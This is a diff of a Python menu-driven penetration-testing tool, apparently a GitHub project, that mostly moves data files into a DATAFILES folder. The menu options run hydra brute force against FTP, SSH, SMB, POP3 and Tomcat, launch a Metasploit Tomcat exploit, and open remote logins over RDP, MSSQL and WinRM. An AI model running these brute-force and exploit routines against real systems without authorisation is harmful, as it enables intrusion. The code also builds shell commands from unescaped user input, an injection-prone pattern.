-         if os.path.getsize("usernames.txt") == 0:
+         if os.path.getsize("DATAFILES/usernames.txt") == 0:
             print("[-] Username file is empty...")
             if USER[:1] != "'":
                print("[*] Adding user '" + USR.rstrip(" ") + "'...")
-               command("echo " + USR.rstrip(" ") + " >> usernames.txt")
+               command("echo " + USR.rstrip(" ") + " >> DATAFILES/usernames.txt")
             else:
                print("[*] Adding user 'administrator'...")
-               command("echo 'administrator' >> usernames.txt")
+               command("echo 'administrator' >> DATAFILES/usernames.txt")
          
-         if os.path.getsize("passwords.txt") == 0:             
+         if os.path.getsize("DATAFILES/passwords.txt") == 0:             
             print("[-] Password file is empty...")
             if HASH[:1] != "'":
                print("[*] Adding password '" + PAS.rstrip(" ") + "'...")
@@ -2808,7 +2713,7 @@ while True:
             print("[-] FTP port not found in LIVE PORTS...")
          
          for x in range (0,maximum):
-            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
+            USER[x] = linecache.getline("DATAFILES/usernames.txt", x + 1).rstrip(" ")
             USER[x] = spacePadding(USER[x], COL3)
             
       prompt() 
@@ -2816,25 +2721,25 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - HYDRA BRUTE FORCE SSH
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='71':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
          
       if checkParams != 1:
-         if os.path.getsize("usernames.txt") == 0:
+         if os.path.getsize("DATAFILES/usernames.txt") == 0:
             print("[-] Username file is empty...")
             if USER[:1] != "'":
                print("[*] Adding user '" + USR.rstrip(" ") + "'...")
-               command("echo " + USR.rstrip(" ") + " >> usernames.txt")
+               command("echo " + USR.rstrip(" ") + " >> DATAFILES/usernames.txt")
             else:
                print("[*] Adding user 'administrator'...")
-               command("echo 'administrator' >> usernames.txt")
+               command("echo 'administrator' >> DATAFILES/usernames.txt")
          
-         if os.path.getsize("passwords.txt") == 0:             
+         if os.path.getsize("DATAFILES/passwords.txt") == 0:             
             print("[-] Password file is empty...")
             if HASH[:1] != "'":
                print("[*] Adding password '" + PAS.rstrip(" ") + "'...")
@@ -2849,7 +2754,7 @@ while True:
             print("[-] SSH port not found in LIVE PORTS...")
          
          for x in range (0,maximum):
-            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
+            USER[x] = linecache.getline("DATAFILES/usernames.txt", x + 1).rstrip(" ")
             USER[x] = spacePadding(USER[x], COL3)
             
       prompt()
@@ -2857,25 +2762,25 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - HYDRA SMB BRUTEFORCE
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='72':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
 
       if checkParams != 1:
-         if os.path.getsize("usernames.txt") == 0:
+         if os.path.getsize("DATAFILES/usernames.txt") == 0:
             print("[-] Username file is empty...")
             if USER[:1] != "'":
                print("[*] Adding user '" + USR.rstrip(" ") + "'...")
-               command("echo " + USR.rstrip(" ") + " >> usernames.txt")
+               command("echo " + USR.rstrip(" ") + " >> DATAFILES/usernames.txt")
             else:
                print("[*] Adding user 'administrator'...")
-               command("echo 'administrator' >> usernames.txt")
+               command("echo 'administrator' >> DATAFILES/usernames.txt")
          
-         if os.path.getsize("passwords.txt") == 0:             
+         if os.path.getsize("DATAFILES/passwords.txt") == 0:             
             print("[-] Password file is empty...")
             if HASH[:1] != "'":
                print("[*] Adding password '" + PAS.rstrip(" ") + "'...")
@@ -2890,7 +2795,7 @@ while True:
             print("[-] SMB port not found in LIVE PORTS...")
          
          for x in range (0,maximum):
-            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
+            USER[x] = linecache.getline("DATAFILES/usernames.txt", x + 1).rstrip(" ")
             USER[x] = spacePadding(USER[x], COL3)
             
       prompt() 
@@ -2898,25 +2803,25 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - HYDRA POP3 BRUTEFORCE
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='73':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
          
       if checkParams != 1:
-         if os.path.getsize("usernames.txt") == 0:
+         if os.path.getsize("DATAFILES/usernames.txt") == 0:
             print("[-] Username file is empty...")
             if USER[:1] != "'":
                print("[*] Adding user '" + USR.rstrip(" ") + "'...")
-               command("echo " + USR.rstrip(" ") + " >> usernames.txt")
+               command("echo " + USR.rstrip(" ") + " >> DATAFILES/usernames.txt")
             else:
                print("[*] Adding user 'administrator'...")
-               command("echo 'administrator' >> usernames.txt")
+               command("echo 'administrator' >> DATAFILES/usernames.txt")
          
-         if os.path.getsize("passwords.txt") == 0:             
+         if os.path.getsize("DATAFILES/passwords.txt") == 0:             
             print("[-] Password file is empty...")
             if HASH[:1] != "'":
                print("[*] Adding password '" + PAS.rstrip(" ") + "'...")
@@ -2934,7 +2839,7 @@ while True:
                print("[-] POP3 ports not found in LIVE PORTS...")
                
          for x in range (0,maximum):
-            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
+            USER[x] = linecache.getline("DATAFILES/usernames.txt", x + 1).rstrip(" ")
             USER[x] = spacePadding(USER[x], COL3)
             
       prompt()
@@ -2942,19 +2847,19 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - TOMCAT WEB ADDRESS BRUTE FORCE
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='74':
+   if selection =='74':  
       if WEB[:5] == "EMPTY":
          print("[-] Target web address not specified...")
       else:
          print("[*] Attempting a tomcat bruteforce on the specified web address, please wait...")
          
-         command("rm usernames.txt")
-         command("rm passwords.txt")
+         command("rm DATAFILES/usernames.txt")
+         command("rm DATAFILES/passwords.txt")
          
          with open('/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt', 'r') as userpasslist:
             for line in userpasslist:
@@ -2962,7 +2867,7 @@ while True:
                command("echo " + one + " >> usernames.tmp")
                command("echo " + two + " >> passwords.tmp")
                
-            command("cat usernames.tmp | sort -u > usernames.txt")
+            command("cat usernames.tmp | sort -u > DATAFILES/usernames.txt")
             command("cat passwords.tmp | sort -u > passwords.txt")
             command("rm *.tmp")
             
@@ -2975,7 +2880,7 @@ while True:
             command("hydra -L usernames.txt -P passwords.txt https-get://" + target.rstrip(" "))
                           
          for x in range (0,maximum):
-            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
+            USER[x] = linecache.getline("DATAFILES/usernames.txt", x + 1).rstrip(" ")
             USER[x] = spacePadding(USER[x], COL3)
             
       prompt()
@@ -2983,7 +2888,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - MSFCONSOLE TOMCAT CLASSIC EXPLOIT
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -3008,22 +2913,21 @@ while True:
       one, two, three, four = target.split(" ")
       target = two.rstrip(" ")
       command("echo 'set lhost " + target + "' >> meterpreter.rc")
-      command("echo 'run' >> meterpreter.rc")
-      command("msfconsole -r meterpreter.rc")
-     
+      command("echo 'run' >> meterpreter.rc")      
+      command("msfconsole -r meterpreter.rc")     
       prompt() 
       command("rm meterpreter.rc")  
            
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - rsync -av rsync://IP:873/SHARENAME SHARENAME
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='76':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
    
       if checkParams != 1:
          if "873" in POR:
@@ -3035,13 +2939,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - rsync -a rsync://IP:873
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='77':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
       
       if checkParams != 1:
          if "873" in POR:
@@ -3053,13 +2957,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - rdesktop - u user -p password -d domain / IP
+# Version : @g3nT_0r@nG3                                                              
+# Details : Menu option selected - rdesktop - u user -p password -d domain / IP port num?
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='78':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
    
       if checkParams != 1:
          command("rdesktop -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' " + TIP.rstrip(" "))
@@ -3068,13 +2972,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - Xfreeredp
+# Version : @g3nT_0r@nG3                                                              
+# Details : Menu option selected - Xfreeredp port number ?
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '79':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
       
       if checkParams != 1:
          command("xfreerdp /u:" + USR.rstrip(" ") + " /p:'" + PAS.rstrip(" ") + "' /v:" + TIP.rstrip(" "))
@@ -3083,13 +2987,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - FTP PORT 21
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='80':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
       
       if checkParams != 1:
          command("ftp " + TIP.rstrip(" ") + " 21")
@@ -3098,13 +3002,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - ssh -l USER IP -p PORT
+# Version : @g3nT_0r@nG3                                                              
+# Details : Menu option selected - ssh -l USER IP -p PORT 22
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='81':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
       
       if checkParams != 1:
          command("ssh -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ") + " -p 22")
@@ -3113,13 +3017,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - ssh -i id USER@IP -p 22
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='82':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
       
       if checkParams != 1:
          command("ssh -i id_rsa " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -p 22")
@@ -3128,13 +3032,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - telnet -l USER IP PORT.
+# Version : @g3nT_0r@nG3                                                              
+# Details : Menu option selected - telnet -l USER IP PORT 23
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='83':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
       
       if checkParams != 1:
          command("telnet -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ") + " 23")
@@ -3143,13 +3047,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - nc IP PORT.
+# Version : @g3nT_0r@nG3                                                              
+# Details : Menu option selected - nc IP PORT 80.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='84':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
       
       if checkParams != 1:
          command("nc " + TIP.rstrip(" ") + " 80")
@@ -3158,13 +3062,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - sqsh -H IP -L user=USER -L password=PASSWORD + exec xp_cmdshell 'whoami'; go PORT 1433
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='85':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
       
       if checkParams != 1:
          command("sqsh -S " + TIP.rstrip(" ") + " -L user=" + USR.rstrip(" ") + " -L password=" + PAS.rstrip(" "))
@@ -3173,13 +3077,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - MSSQLCLIENT PORT 1433
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='86':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
    
       if checkParams != 1:
           command(keypath + "mssqlclient.py " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
@@ -3190,13 +3094,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - MYSQL PORT 3306
+# Version : @g3nT_0r@nG3                                                              
+# Details : Menu option selected - MYSQL Login using port 3306
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='87':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
       
       if checkParams != 1:
          command("mysql -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -h " + TIP.rstrip(" "))
@@ -3205,13 +3109,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - Windows remote login on POR 5985.
+# Version : @g3nT_0r@nG3                                                              
+# Details : Menu option selected - WINRM remote login using PORT 5985
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='88':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
       
       if checkParams != 1:            
          if NTM[:5] != "EMPTY":
@@ -3224,41 +3128,31 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - Save current data to config.txt and exit the program.
+# Version : @g3nT_0r@nG3                                                              
+# Details : Menu option selected - Save config to DATAFILES/config.txt and exit program
 # Modified: N/A
+# Status  : Streamlined
 # -------------------------------------------------------------------------------------
 
-   if selection == '89':
-      if os.path.exists("config.txt"):
-         command("rm config.txt")				# DELETE OLD CONFIG FILE
-         
-      command("echo " + DNS + " >> config.txt")
-      command("echo " + TIP + " >> config.txt")
-      command("echo " + PTS + " >> config.txt")  
-      command("echo " + WEB + " >> config.txt")  
-
-      null = "\\'\\'"
-      if USR.rstrip(" ") == "''":
-         command("echo " + null + " >> config.txt")
-      else:
-         command("echo '" + USR  + "' >> config.txt")           
-      if PAS.rstrip(" ") == "''":
-         command("echo " + null + " >> config.txt")
-      else:
-         command("echo '" + PAS  + "' >> config.txt")     
- 
-      command("echo " + NTM + " >> config.txt")
-      command("echo " + DOM + " >> config.txt")  
-      command("echo " + SID + " >> config.txt")
-      command("echo " + TSH + " >> config.txt")  
-      command("echo " + LTM + " >> config.txt")  
-      command("echo " + DIR + " >> config.txt")   
+   if selection == '89':        
+      with open("DATAFILES/config.txt", "w") as config:
+         config.write(DNS + "\n")
+         config.write(TIP + "\n")
+         config.write(PTS + "\n")
+         config.write(WEB + "\n")
+         config.write(USR + "\n")
+         config.write(PAS + "\n")
+         config.write(NTM + "\n")
+         config.write(DOM + "\n")
+         config.write(SID + "\n")
+         config.write(TSH + "\n")
+         config.write(LTM + "\n")
+         config.write(DIR + "\n")
       
       if DOMC == 1:
+         print("[*] Removing domain name from /etc/hosts...")
          command("sed -i '$d' /etc/hosts")
-      if len(os.listdir(DIR.rstrip(" "))) == 0:
-         os.rmdir(DIR.rstrip(" "))
+       
+      print("[*] All enumerated data has been saved...")
       exit(1)
-
 # Eof...	
